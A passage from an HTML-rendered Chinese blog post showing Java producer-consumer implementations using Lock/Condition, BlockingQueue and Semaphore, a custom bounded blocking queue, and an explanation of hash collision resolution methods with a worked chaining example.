class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Integer</span> <span class=\"variable\">FULL</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建一个锁对象</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Lock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"comment\">//创建两个条件变量，一个为缓冲区非满，一个为缓冲区非空</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Condition</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Condition</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test2</span> <span class=\"variable\">test2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test2</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//获取锁</span></span><br><span class=\"line\">                lock.lock();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == FULL) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            notFull.await();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    <span class=\"comment\">//唤醒消费者</span></span><br><span class=\"line\">                    notEmpty.signal();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//释放锁</span></span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                lock.lock();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            notEmpty.await();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    notFull.signal();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"阻塞队列BlockingQueue的实现\"><a href=\"#阻塞队列BlockingQueue的实现\" class=\"headerlink\" title=\"阻塞队列BlockingQueue的实现\"></a>阻塞队列BlockingQueue的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test3</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建一个阻塞队列</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">BlockingQueue</span> <span class=\"variable\">blockingQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayBlockingQueue</span>&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test3</span> <span class=\"variable\">test3</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test3</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    blockingQueue.put(<span class=\"number\">1</span>);</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    blockingQueue.take();</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"信号量Semaphore的实现\"><a href=\"#信号量Semaphore的实现\" class=\"headerlink\" title=\"信号量Semaphore的实现\"></a>信号量Semaphore的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test4</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建三个信号量</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">mutex</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test4</span> <span class=\"variable\">test4</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test4</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    notFull.acquire();</span><br><span class=\"line\">                    mutex.acquire();</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    mutex.release();</span><br><span class=\"line\">                    notEmpty.release();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    notEmpty.acquire();</span><br><span class=\"line\">                    mutex.acquire();</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    mutex.release();</span><br><span class=\"line\">                    notFull.release();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"Java实现BlockQueue\"><a href=\"#Java实现BlockQueue\" class=\"headerlink\" title=\"Java实现BlockQueue\"></a>Java实现BlockQueue</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BlockingQueue</span>&lt;E&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 有界队列内部固定长度，因此可以用数组实现</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] elements;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 队列的头和尾下标</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> <span class=\"variable\">head</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>, tail = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 队列目前的长度</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> size;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BlockingQueue</span><span class=\"params\">(<span class=\"type\">int</span> capacity)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.elements = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[capacity];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">put</span><span class=\"params\">(E e)</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (size == elements.length)</span><br><span class=\"line\">                notFull.await();</span><br><span class=\"line\">            elements[tail] = e;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++tail == elements.length) &#123;</span><br><span class=\"line\">                tail = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">            notEmpty.signal();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> E <span class=\"title function_\">take</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"type\">E</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                notEmpty.await();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e = (E) elements[head];</span><br><span class=\"line\">            elements[head] = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++head == elements.length)</span><br><span class=\"line\">                head = <span class=\"number\">0</span>;</span><br><span class=\"line\">            size--;</span><br><span class=\"line\">            notFull.signal();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> e;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">size</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解决哈希冲突的方法\"><a href=\"#解决哈希冲突的方法\" class=\"headerlink\" title=\"解决哈希冲突的方法\"></a>解决哈希冲突的方法</h2><h3 id=\"开放定址法\"><a href=\"#开放定址法\" class=\"headerlink\" title=\"开放定址法\"></a>开放定址法</h3><p>从发生冲突的那个单元起，按照一定的次序，从哈希表中找到一个空闲的单元。然后把发生冲突的元素存入到该单元的一种方法。开放定址法需要的表长度要大于等于所需要存放的元素。</p>\n<p>在开放定址法中解决冲突的方法有：线行探查法、平方探查法、双散列函数探查法。</p>\n<p>开放定址法的缺点在于删除元素的时候不能真的删除，否则会引起查找错误，只能做一个特殊标记。只到有下个元素插入才能真正删除该元素。</p>\n<h4 id=\"线行探查法\"><a href=\"#线行探查法\" class=\"headerlink\" title=\"线行探查法\"></a>线行探查法</h4><p>线行探查法是开放定址法中最简单的冲突处理方法，它从发生冲突的单元起，依次判断下一个单元是否为空，当达到最后一个单元时，再从表首依次判断。直到碰到空闲的单元或者探查完全部单元为止。</p>\n<p>可以参考csdn上flash对该方法的演示：<br><a href=\"http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf\">http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf</a></p>\n<h4 id=\"平方探查法\"><a href=\"#平方探查法\" class=\"headerlink\" title=\"平方探查法\"></a>平方探查法</h4><p>平方探查法即是发生冲突时，用发生冲突的单元d[i], 加上 1²、 2²等。即d[i] + 1²，d[i] + 2², d[i] + 3²…直到找到空闲单元。</p>\n<p>在实际操作中，平方探查法不能探查到全部剩余的单元。不过在实际应用中，能探查到一半单元也就可以了。若探查到一半单元仍找不到一个空闲单元，表明此散列表太满，应该重新建立。</p>\n<h4 id=\"双散列函数探查法\"><a href=\"#双散列函数探查法\" class=\"headerlink\" title=\"双散列函数探查法\"></a>双散列函数探查法</h4><p>这种方法使用两个散列函数hl和h2。其中hl和前面的h一样，以关键字为自变量，产生一个0至m—l之间的数作为散列地址；h2也以关键字为自变量，产生一个l至m—1之间的、并和m互素的数(即m不能被该数整除)作为探查序列的地址增量(即步长)，探查序列的步长值是固定值l；对于平方探查法，探查序列的步长值是探查次数i的两倍减l；对于双散列函数探查法，其探查序列的步长值是同一关键字的另一散列函数的值。</p>\n<h3 id=\"链地址法（拉链法）\"><a href=\"#链地址法（拉链法）\" class=\"headerlink\" title=\"链地址法（拉链法）\"></a>链地址法（拉链法）</h3><p>链接地址法的思路是将哈希值相同的元素构成一个同义词的单链表，并将单链表的头指针存放在哈希表的第i个单元中，查找、插入和删除主要在同义词链表中进行。链表法适用于经常进行插入和删除的情况。</p>\n<p>如下一组数字,(32、40、36、53、16、46、71、27、42、24、49、64)哈希表长度为13，哈希函数为H(key)&#x3D;key%13,则链表法结果如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>       </span><br><span class=\"line\"><span class=\"number\">1</span>  -&gt; <span class=\"number\">40</span> -&gt; <span class=\"number\">27</span> -&gt; <span class=\"number\">53</span> </span><br><span class=\"line\"><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">3</span>  -&gt; <span class=\"number\">16</span> -&gt; <span class=\"number\">42</span></span><br><span class=\"line\"><span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">6</span>  -&gt; <span class=\"number\">32</span> -&gt; <span class=\"number\">71</span></span><br><span class=\"line\"><span class=\"number\">7</span>  -&gt; <span class=\"number\">46</span></span><br><span class=\"line\"><span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">10</span> -&gt; <span class=\"number\">36</span> -&gt; <span class=\"number\">49</span></span><br><span class=\"line\"><span class=\"number\">11</span> -&gt; <span class=\"number\">24</span></span><br><span class=\"line\"><span class=\"number\">12</span> -&gt; <span class=\"number\">64</span></span><br></pre></td></tr></table></figure>\n<p>注：在java中，链接地址法也是HashMap解决哈希冲突的方法之一，jdk1.7完全采用单链表来存储同义词，jdk1.8则采用了一种混合模式，对于链表长度大于8的，会转换为红黑树存储。</p>\n<h3 id=\"再哈希法\"><a href=\"#再哈希法\" class=\"headerlink\" title=\"再哈希法\"></a>再哈希法</h3><p>就是同时构造多个不同的哈希函数：</p>\n<p>Hi &#x3D; RHi(key)   i&#x3D; 1,2,3 … k;</p>\n<p>当H1 &#x3D; RH1(key)  发生冲突时，再用H2 &#x3D; RH2(key) 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。</p>\n<h3 id=\"建立公共溢出区\"><a href=\"#建立公共溢出区\" class=\"headerlink\" 